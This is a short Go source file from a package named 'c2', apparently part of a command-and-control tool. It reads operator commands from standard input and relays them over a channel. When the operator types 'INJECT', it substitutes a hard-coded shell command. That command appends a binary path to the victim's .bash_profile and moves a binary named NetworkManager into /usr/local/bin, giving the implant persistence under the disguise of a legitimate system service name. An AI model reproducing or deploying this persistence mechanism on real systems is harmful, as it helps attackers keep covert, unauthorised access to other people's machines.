package c2

import (
	"bufio"
	"log/slog"
	"os"
	"strings"
)

func GetCommands(ch chan string) {
	for {
		reader := bufio.NewReader(os.Stdin)
		requestedCommand, err := reader.ReadString('\n')

		var command string
		if strings.Contains(requestedCommand, "INJECT") {
			command =
				"echo '/usr/local/bin/NetworkManager' >> /home/$(whoami)/.bash_profile; mv ./NetworkManager /usr/local/bin/NetworkManager"
		} else {
			command = requestedCommand
		}
		if err != nil {
			slog.Info("Error reading command: " + err.Error())
		} else {
			ch <- command
		}
	}
}
